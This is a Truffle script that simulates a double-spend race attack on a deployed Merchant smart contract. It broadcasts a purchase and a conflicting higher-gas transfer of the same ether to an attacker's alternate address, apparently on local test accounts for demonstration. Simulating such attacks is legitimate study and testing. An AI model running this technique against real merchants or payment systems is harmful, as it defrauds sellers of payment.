const Merchant = artifacts.require("Merchant");
const simulateRaceAttack = async (accounts) => {
  const attacker = accounts[0];
  const merchant = await Merchant.deployed();
  const attackerAlternateAddress = accounts[2];
  const attackAmount = web3.utils.toWei('1', 'ether');
  console.log("Simulating Race Attack...");
  console.log("Attacker's address:", attacker);
  console.log("Merchant's address:", merchant.address);
  console.log("Attacker's alternate address:", attackerAlternateAddress);
  try {
    const txA = merchant.buyItem({
      from: attacker,
      value: attackAmount,
      gasPrice: web3.utils.toWei('20', 'gwei')
    });
    
    const txB = web3.eth.sendTransaction({
      from: attacker,
      to: attackerAlternateAddress,
      value: attackAmount,
      gasPrice: web3.utils.toWei('50', 'gwei')  // Higher gas price
    });
    console.log("Broadcasting transactions...");
    const [receiptA, receiptB] = await Promise.all([txA, txB]);
    console.log("Transaction A (to merchant) hash:", receiptA.tx);
    console.log("Transaction B (to attacker's alternate address) hash:", receiptB.transactionHash);
    console.log("Simulation completed. Check the transaction hashes in your blockchain explorer.");
  } catch (error) {
    console.error("Error during transaction broadcast:", error);
  }
};
module.exports = async function(callback) {
  try {
    const accounts = await web3.eth.getAccounts();
    await simulateRaceAttack(accounts);
  } catch (error) {
    console.error("Error during simulation:", error);
  }
  callback();
};